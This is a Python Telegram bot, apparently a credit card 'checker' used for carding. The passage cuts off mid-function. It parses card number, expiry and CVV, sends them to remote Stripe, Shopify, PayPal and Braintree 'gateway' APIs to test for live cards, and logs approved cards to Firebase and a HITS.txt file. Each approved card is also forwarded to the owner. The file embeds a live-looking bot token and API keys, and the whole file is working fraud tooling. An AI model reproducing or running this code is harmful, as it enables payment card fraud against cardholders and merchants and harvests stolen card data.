import io
import telebot
from telebot import types
import requests
import time
import threading
import json
from datetime import datetime, timedelta
import psutil
import humanize
import random
import re

# Bot configuration
TOKEN = '7680639717:AAEuzQ-Q1MIktzDMTq54LLfwfV8selANTqE'
bot = telebot.TeleBot(TOKEN)

# Firebase configuration
FIREBASE_BASE_URL = 'https://stormx-ffbbb-default-rtdb.firebaseio.com'

# Channel and group information
GROUP_LINK = "https://t.me/+s_5RryWDEFJmYzU1"
GROUP_ID = -1002583551266
CHANNEL_LINK = "https://t.me/stormxvup"
CHANNEL_ID = -1002480217592
HELP_BOT_LINK = "https://t.me/stormhelpbot"
ADMIN_LINK = "http://t.me/darkboy336"
BOT_IMAGE = "https://i.ibb.co/ZpnxmKgK/6183713017804474200.jpg"
OWNER_ID = 6521162324  # Your Telegram user ID

# API Endpoints
GATEWAY_API_CC = "http://69.197.134.89:5001/gate=site/key=d4rk/cc="
GATEWAY_API_CHK = "https://api-sp-storm.onrender.com/gate=stripe4/keydarkwaslost/cc="
VBV_API_URL = "https://vbv-by-dark-waslost.onrender.com/key=darkwaslost/cc="
SHOPIFY_API_URL = "https://api-cc-stormx-1.onrender.com/key=cytron/cc="
B4_API_URL = "YOUR_B4_API_URL"  # Replace with your actual B4 API URL

BIN_LOOKUP_API = "https://bins.antipublic.cc/bins/"

# User cooldowns and credits
user_cooldowns = {}
FLOOD_WAIT_TIME = 15  # seconds
CREDITS_PER_HOUR = 50
last_credit_refresh = time.time()

# Bot status
bot_active = True
checker_active = True

# ====================== UTILITY FUNCTIONS ======================

def read_firebase(path):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            return res.json() or {}
        return {}
    except Exception as e:
        print(f"Firebase read error ({path}): {str(e)}")
        return {}

def write_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.put(url, json=data, timeout=10)
        return res.status_code == 200
    except Exception as e:
        print(f"Firebase write error ({path}): {str(e)}")
        return False

def update_firebase(path, data):
    url = f"{FIREBASE_BASE_URL}/{path}.json"
    try:
        res = requests.patch(url, json=data, timeout=10)
        return res.status_code == 200
    except Exception as e:
        print(f"Firebase update error ({path}): {str(e)}")
        return False

def init_firebase():
    paths = [
        "users_pixel",
        "approved_cards",
        "declined_cards",
        "groups_pixel",
        "all_cards",
        "logs_pixel",
        "stats_pixel"
    ]
    for path in paths:
        if not read_firebase(path):
            write_firebase(path, {})

def is_member(user_id):
    try:
        group_status = bot.get_chat_member(GROUP_ID, user_id).status
        channel_status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return group_status not in ['left', 'kicked'] and channel_status not in ['left', 'kicked']
    except Exception as e:
        print(f"Membership check error: {e}")
        return False

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    return user_id == OWNER_ID

def is_restricted(user_id):
    users = read_firebase("users_pixel") or {}
    if str(user_id) in users and users[str(user_id)].get('restricted', False):
        restriction_end = users[str(user_id)].get('restriction_end', '2000-01-01 00:00:00')
        try:
            end_time = datetime.strptime(restriction_end, "%Y-%m-%d %H:%M:%S")
            if datetime.now() < end_time:
                return True
            else:
                users[str(user_id)]['restricted'] = False
                write_firebase("users_pixel", users)
        except:
            return False
    return False

def refresh_credits():
    global last_credit_refresh
    current_time = time.time()
    if current_time - last_credit_refresh >= 3600:
        users = read_firebase("users_pixel")
        for user_id in users:
            if int(user_id) != OWNER_ID:
                users[user_id]['credits'] = CREDITS_PER_HOUR
        write_firebase("users_pixel", users)
        last_credit_refresh = current_time

def get_user_credits(user_id):
    users = read_firebase("users_pixel")
    if str(user_id) not in users:
        users[str(user_id)] = {
            'credits': CREDITS_PER_HOUR,
            'total_checks': 0,
            'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        write_firebase("users_pixel", users)
        return CREDITS_PER_HOUR
    return users[str(user_id)].get('credits', 0)

def deduct_credit(user_id):
    if user_id == OWNER_ID:
        return True
    
    users = read_firebase("users_pixel")
    if str(user_id) not in users:
        users[str(user_id)] = {'credits': CREDITS_PER_HOUR - 1, 'total_checks': 1}
    else:
        users[str(user_id)]['credits'] = max(0, users[str(user_id)].get('credits', 0) - 1)
        users[str(user_id)]['total_checks'] = users[str(user_id)].get('total_checks', 0) + 1
    return write_firebase("users_pixel", users)

def get_bin_info(bin_number):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"{BIN_LOOKUP_API}{bin_number[:6]}", timeout=10)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(f"Bin lookup attempt {attempt + 1} failed: {str(e)}")
            time.sleep(1)
    return None

def parse_card_input(text):
    # Improved card pattern matching
    card_pattern = r'(\d{13,19})[\s|/]*(\d{1,2})[\s|/]*(\d{2,4})[\s|/]*(\d{3,4})'
    match = re.search(card_pattern, text)
    
    if not match:
        return None
    
    cc = match.group(1)
    mm = match.group(2).zfill(2)  # Ensure 2-digit month
    yy = match.group(3)
    cvv = match.group(4)
    
    # Handle year format (2-digit or 4-digit)
    if len(yy) == 2:
        current_year_short = datetime.now().year % 100
        input_year = int(yy)
        if input_year >= current_year_short - 10:  # Consider years within 10 years range
            yy = '20' + yy  # 22 → 2022
        else:
            yy = '20' + yy  # Default to 20xx for all 2-digit years
    elif len(yy) != 4:
        return None
    
    # Validate month
    if not (1 <= int(mm) <= 12):
        return None
    
    # Validate CVV
    if not (3 <= len(cvv) <= 4):
        return None
    
    return f"{cc}|{mm}|{yy}|{cvv}"

def format_card_message(result, user, elapsed_time):
    status_display = f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if result['status'] == 'APPROVED' else f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    
    # Get issuer/bank from bin_info if available
    bin_info = get_bin_info(result['card'].split('|')[0]) if 'card' in result else None
    issuer = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
    
    message = (
        f"{status_display}\n\n"
        f"𝐂𝐚𝐫𝐝\n  ↳ <code>{result['card']}</code>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>\n\n"
        f"𝐈𝐧𝐟𝐨 ⌁ {result['brand']} {result['type']}\n"
        f"𝐈𝐬𝐬𝐮𝐞𝐫 ⌁ {issuer}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}\n\n"
        f"𝐑𝐞𝐪 ⌁ <a href='tg://user?id={user.id}'>{user.first_name}</a>\n"
        f"𝐃𝐞𝐯 ⌁ <a href='tg://user?id={OWNER_ID}'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>\n"
        f"𝐓𝐢𝐦𝐞 ⌁ {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
    )
    return message

def log_card_check(user_id, card, status, response, gateway):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = {
        'user_id': user_id,
        'card': card,
        'status': status,
        'response': response,
        'gateway': gateway,
        'timestamp': timestamp
    }
    
    # Save to all cards
    all_cards = read_firebase("all_cards") or {}
    all_cards[str(int(time.time()))] = log_entry
    write_firebase("all_cards", all_cards)
    
    # Save to status-specific collections
    if "APPROVED" in status:
        approved_cards = read_firebase("approved_cards") or {}
        approved_cards[str(int(time.time()))] = log_entry
        write_firebase("approved_cards", approved_cards)
    else:
        declined_cards = read_firebase("declined_cards") or {}
        declined_cards[str(int(time.time()))] = log_entry
        write_firebase("declined_cards", declined_cards)
    
    # Save to user logs
    user_logs = read_firebase(f"logs_pixel/{user_id}") or {}
    user_logs[str(int(time.time()))] = log_entry
    write_firebase(f"logs_pixel/{user_id}", user_logs)
    
    # Update stats
    stats = read_firebase("stats_pixel") or {'total_checks': 0, 'approved': 0, 'declined': 0}
    stats['total_checks'] = stats.get('total_checks', 0) + 1
    if "APPROVED" in status:
        stats['approved'] = stats.get('approved', 0) + 1
    else:
        stats['declined'] = stats.get('declined', 0) + 1
    write_firebase("stats_pixel", stats)

# ====================== CARD CHECKING FUNCTIONS ======================

def check_cc_generic(cc, api_url, gateway_name):
    try:
        card = parse_card_input(cc)
        if not card:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card format',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': gateway_name
            }
        
        # Get bin info
        bin_info = get_bin_info(card.split('|')[0])
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
        
        try:
            response = requests.get(f"{api_url}{card}", timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': gateway_name
                    }
                    
                status = data.get('status', 'Declined').replace('Declined ❌', 'DECLINED').replace('Declined', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Approved' in status:
                    status = 'APPROVED'
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': gateway_name
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': gateway_name
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': gateway_name
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': gateway_name
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': gateway_name
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': gateway_name
        }

def check_cc_cc(cc):
    return check_cc_generic(cc, GATEWAY_API_CC, "Site Based [1$]")

def check_chk_cc(cc):
    return check_cc_generic(cc, GATEWAY_API_CHK, "Stripe Auth")

def check_vbv_cc(cc):
    return check_cc_generic(cc, VBV_API_URL, "VBV Check")

def check_shopify_cc(cc):
    try:
        card = parse_card_input(cc)
        if not card:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card format',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Shopify + graphQL [10$]'
            }
        
        # Get bin info
        bin_info = get_bin_info(card.split('|')[0])
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
        
        # Random delay between 20-30 seconds
        delay_time = random.uniform(20, 30)
        time.sleep(delay_time)
        
        try:
            response = requests.get(f"{SHOPIFY_API_URL}{card}", timeout=35)
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = data.get('status', 'Declined').replace('Declined 🚫', 'DECLINED').replace('Declined', 'DECLINED')
                    message = data.get('response', 'Your card was declined.')
                    
                    # Proper status determination
                    is_declined = any(
                        decline_word in status.lower() 
                        for decline_word in ['decline', 'declined', 'failed', 'error', 'generic']
                    )
                    
                    return {
                        'status': 'DECLINED' if is_declined else 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Shopify + graphQL [10$]'
                    }
                    
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Shopify + graphQL [10$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Shopify + graphQL [10$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Shopify + graphQL [10$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Shopify + graphQL [10$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Shopify + graphQL [10$]'
        }

def check_b4_cc(cc):
    try:
        card = parse_card_input(cc)
        if not card:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card format',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Primium Auth 2'
            }
        
        # Get bin info
        bin_info = get_bin_info(card.split('|')[0])
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(B4_API_URL.format(card), headers=headers, timeout=300)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Primium Auth 2'
                    }
                    
                status = data.get('status', '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱')
                message = data.get('response', 'Declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success' , '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Primium Auth 2'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error' '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱']):
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Primium Auth 2'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Primium Auth 2'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Primium Auth 2'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Primium Auth 2'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Primium Auth 2'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Primium Auth 2'
        }

# ====================== COMMAND HANDLERS ======================

def handle_card_check(message, check_function, gateway_name):
    if not bot_active or not checker_active:
        bot.reply_to(message, "❌ Card checking is currently disabled by admin.")
        return
    
    user = message.from_user
    if is_restricted(user.id):
        bot.reply_to(message, "⛔ You are restricted from using this bot.")
        return
    
    current_time = time.time()
    if user.id in user_cooldowns and current_time - user_cooldowns[user.id] < FLOOD_WAIT_TIME:
        remaining = int(FLOOD_WAIT_TIME - (current_time - user_cooldowns[user.id]))
        bot.reply_to(message, f"⏳ Please wait {remaining} seconds before checking another card.")
        return
    
    if user.id != OWNER_ID and get_user_credits(user.id) <= 0:
        bot.reply_to(message, "❌ You don't have enough credits. Wait for hourly refresh.")
        return
    
    # Extract card from message or reply
    if message.reply_to_message:
        text = message.reply_to_message.text
    else:
        text = message.text
    
    # Remove command prefix if present
    if text.startswith(('.cc ', '.chk ', '.vbv ', '.sh ', '.b4 ')):
        text = text[4:].strip()
    elif text.startswith(('/cc ', '/chk ', '/vbv ', '/sh ', '/b4 ')):
        text = text[4:].strip()
    
    card = parse_card_input(text)
    if not card:
        bot.reply_to(message, "❌ Invalid card format. Use CC|MM|YYYY|CVV or CC|MM|YY|CVV")
        return
    
    initial_msg = (
        f"↝ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠....\n\n"
        f"𝐂𝐚𝐫𝐝\n  ↳ <code>{card}</code>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway_name}</i>\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Fetching</i>"
    )
    sent_msg = bot.reply_to(message, initial_msg, parse_mode='HTML')
    
    user_cooldowns[user.id] = current_time
    if not deduct_credit(user.id):
        bot.reply_to(message, "❌ Error updating credits. Please try again.")
        return
    
    start_time = time.time()
    
    def process_check():
        try:
            result = check_function(card)
            elapsed_time = time.time() - start_time
            result_msg = format_card_message(result, user, elapsed_time)
            
            bot.edit_message_text(
                result_msg,
                chat_id=sent_msg.chat.id,
                message_id=sent_msg.message_id,
                parse_mode='HTML'
            )
            
            log_card_check(
                user.id,
                card,
                result['status'],
                result['message'],
                result['gateway']
            )
            
            if result['status'] == 'APPROVED':
                bot.send_message(OWNER_ID, f"✅ Approved Card from {user.first_name} (@{user.username or 'N/A'}):\n{card}")
        except Exception as e:
            bot.edit_message_text(
                "❌ Failed to check card. Please try again later.",
                chat_id=sent_msg.chat.id,
                message_id=sent_msg.message_id
            )
            print(f"Error processing card check: {str(e)}")
    
    threading.Thread(target=process_check).start()

# Command handlers for different check types
@bot.message_handler(commands=['cc'])
def cc_command(message):
    handle_card_check(message, check_cc_cc, "Site Based [1$]")

@bot.message_handler(commands=['chk'])
def chk_command(message):
    handle_card_check(message, check_chk_cc, "Stripe Auth")

@bot.message_handler(commands=['vbv'])
def vbv_command(message):
    handle_card_check(message, check_vbv_cc, "VBV Check")

@bot.message_handler(commands=['sh'])
def sh_command(message):
    handle_card_check(message, check_shopify_cc, "Shopify + graphQL [10$]")

@bot.message_handler(commands=['b4'])
def b4_command(message):
    handle_card_check(message, check_b4_cc, "Braintree Primium Auth 2")

# Dot command handlers
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.cc ') or m.text == '.cc'))
def dot_cc_command(message):
    handle_card_check(message, check_cc_cc, "Site Based [1$]")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.chk ') or m.text == '.chk'))
def dot_chk_command(message):
    handle_card_check(message, check_chk_cc, "Stripe Auth")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.vbv ') or m.text == '.vbv'))
def dot_vbv_command(message):
    handle_card_check(message, check_vbv_cc, "VBV Check")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.sh ') or m.text == '.sh'))
def dot_sh_command(message):
    handle_card_check(message, check_shopify_cc, "Shopify + graphQL [10$]")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.b4 ') or m.text == '.b4'))
def dot_b4_command(message):
    handle_card_check(message, check_b4_cc, "Braintree Primium Auth 2")

# Add this with your other API endpoints
AU_API_URL = "https://au-api-storm.onrender.com/gate=stripe5/key=wasdark/cc="

# Add this checking function with your other check functions
def check_au_cc(cc):
    return check_cc_generic(cc, AU_API_URL, "Stripe Auth 2")

# Add these command handlers with your other command handlers
@bot.message_handler(commands=['au'])
def au_command(message):
    handle_card_check(message, check_au_cc, "Stripe Auth 2")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.au ') or m.text == '.au'))
def dot_au_command(message):
    handle_card_check(message, check_au_cc, "Stripe Auth 2")

PP_API_URL = "https://paypal-ox9w.onrender.com/gate=1/key=darkwaslost/cc="

# Add this checking function with your other check functions
def check_pp_cc(cc):
    return check_cc_generic(cc, PP_API_URL, "Paypal [2$]")

# Add these command handlers with your other command handlers
@bot.message_handler(commands=['pp'])
def pp_command(message):
    handle_card_check(message, check_pp_cc, "Paypal [2$]")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.au ') or m.text == '.pp'))
def dot_pp_command(message):
    handle_card_check(message, check_pp_cc, "Paypal [2$]")

# Start command and menu handlers
@bot.message_handler(commands=['start'])
def start_command(message):
    if is_member(message.from_user.id):
        show_menu_button(message)
    else:
        show_join_buttons(message)

def show_menu_button(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Menu", callback_data="show_menu"))
    
    if isinstance(message, types.Message):
        bot.send_photo(
            message.chat.id,
            photo=BOT_IMAGE,
            caption="Welcome back! Click Menu to continue.",
            reply_markup=markup,
            parse_mode='HTML'
        )
    elif isinstance(message, types.CallbackQuery):
        bot.edit_message_media(
            chat_id=message.message.chat.id,
            message_id=message.message.message_id,
            media=types.InputMediaPhoto(
                media=BOT_IMAGE,
                caption="Welcome back! Click Menu to continue."
            ),
            reply_markup=markup
        )

def show_join_buttons(message):
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("Group", url=GROUP_LINK),
        types.InlineKeyboardButton("Main", url=CHANNEL_LINK)
    )
    markup.add(types.InlineKeyboardButton("Verify", callback_data="verify"))
    
    if isinstance(message, types.Message):
        bot.send_photo(
            message.chat.id,
            photo=BOT_IMAGE,
            caption="Join below to use this bot",
            reply_markup=markup,
            parse_mode='HTML'
        )
    elif isinstance(message, types.CallbackQuery):
        bot.edit_message_media(
            chat_id=message.message.chat.id,
            message_id=message.message.message_id,
            media=types.InputMediaPhoto(
                media=BOT_IMAGE,
                caption="Join below to use this bot"
            ),
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_callback(call):
    if is_member(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_menu_button(call)
    else:
        bot.answer_callback_query(call.id, "Please join both group and channel first!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "show_menu")
def main_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("Auth", callback_data="auth"),
        types.InlineKeyboardButton("Charged", callback_data="charged"),
        types.InlineKeyboardButton("Tools", callback_data="tools"),
        types.InlineKeyboardButton("Help", callback_data="help"),
        types.InlineKeyboardButton("Back", callback_data="back_start")
    ]
    markup.add(*buttons)
    
    bot.edit_message_media(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        media=types.InputMediaPhoto(
            media=BOT_IMAGE,
            caption="Main Menu\n\nSelect an option:"
        ),
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "auth")
def auth_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("Braintree", callback_data="braintree"),
        types.InlineKeyboardButton("Stripe", callback_data="stripe"),
        types.InlineKeyboardButton("Paypal", callback_data="paypal"),
        types.InlineKeyboardButton("3DS Lookup", callback_data="3ds_lookup"),
        types.InlineKeyboardButton("Back", callback_data="show_menu")
    ]
    markup.add(*buttons)
    
    bot.edit_message_media(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        media=types.InputMediaPhoto(
            media=BOT_IMAGE,
            caption="Auth Options\n\nSelect a payment processor:"
        ),
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "stripe")
def stripe_info(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Back", callback_data="auth"))
    
    info_text = (
        "──────── ⸙ ─────────\n"
        "Gateway ↝ Stripe Auth\n"
        "Command ↝ /chk\n"
        "Status ↝ Up 🟢\n"
        "──────── ⸙ ─────────"
    )
    
    bot.edit_message_media(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        media=types.InputMediaPhoto(
            media=BOT_IMAGE,
            caption=info_text
        ),
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "charged")
def charged_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("Shopify", callback_data="shopify"),
        types.InlineKeyboardButton("Stripe", callback_data="stripe_charged"),
        types.InlineKeyboardButton("Braintree", callback_data="braintree_charged"),
        types.InlineKeyboardButton("Site Based", callback_data="site_based"),
        types.InlineKeyboardButton("Paypal", callback_data="paypal_charged"),
        types.InlineKeyboardButton("Adyen", callback_data="adyen"),
        types.InlineKeyboardButton("Payflow", callback_data="payflow"),
        types.InlineKeyboardButton("Square", callback_data="square"),
        types.InlineKeyboardButton("Back", callback_data="show_menu")
    ]
    markup.add(*buttons)
    
    bot.edit_message_media(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        media=types.InputMediaPhoto(
            media=BOT_IMAGE,
            caption="Charged Options\n\nSelect a charging method:"
        ),
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "site_based")
def site_based_info(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Back", callback_data="charged"))
    
    info_text = (
        "──────── ⸙ ─────────\n"
        "Gateway ↝ Site Based\n"
        "Charge ↝ 1$\n"
        "Command ↝ /cc\n"
        "Status ↝ Up 🟢\n"
        "──────── ⸙ ─────────"
    )
    
    bot.edit_message_media(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        media=types.InputMediaPhoto(
            media=BOT_IMAGE,
            caption=info_text
        ),
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data in [
    "braintree", "paypal", "3ds_lookup",
    "shopify", "stripe_charged", "braintree_charged",
    "paypal_charged", "adyen", "payflow", "square"
])
def feature_info(call):
    feature_name = call.data.replace('_', ' ').title()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Back", callback_data=f"back_to_{call.data.split('_')[0]}"))
    
    bot.edit_message_media(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        media=types.InputMediaPhoto(
            media=BOT_IMAGE,
            caption=f"{feature_name} Checker\n\nComing soon!\n\nStay tuned for updates."
        ),
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("back_to_"))
def back_from_feature(call):
    menu_type = call.data.replace("back_to_", "")
    if menu_type in ["auth", "charged", "tools"]:
        globals()[f"{menu_type}_menu"](call)
    else:
        main_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "back_start")
def back_to_start(call):
    if is_member(call.from_user.id):
        show_menu_button(call)
    else:
        show_join_buttons(call)

# Admin commands
@bot.message_handler(commands=['approved'])
def send_approved_cards(message):
    if not is_owner(message.from_user.id):
        return
    send_logs(message.chat.id, "approved")

@bot.message_handler(commands=['declined'])
def send_declined_cards(message):
    if not is_owner(message.from_user.id):
        return
    send_logs(message.chat.id, "declined")

@bot.message_handler(commands=['logs'])
def send_all_logs(message):
    if not is_owner(message.from_user.id):
        return
    send_logs(message.chat.id, "all")

def send_logs(chat_id, log_type="all"):
    if log_type == "approved":
        data = read_firebase("approved_cards") or {}
        filename = "approved_cards.txt"
    elif log_type == "declined":
        data = read_firebase("declined_cards") or {}
        filename = "declined_cards.txt"
    else:
        data = read_firebase("all_cards") or {}
        filename = "all_logs.txt"
    
    if not data:
        bot.send_message(chat_id, f"No {log_type} logs available.")
        return
    
    try:
        # Open file with UTF-8 encoding to handle Unicode characters
        with open(filename, 'w', encoding='utf-8') as f:
            for timestamp, entry in sorted(data.items(), key=lambda x: int(x[0])):
                # Replace Unicode characters with text equivalents
                status = entry.get('status', 'N/A')
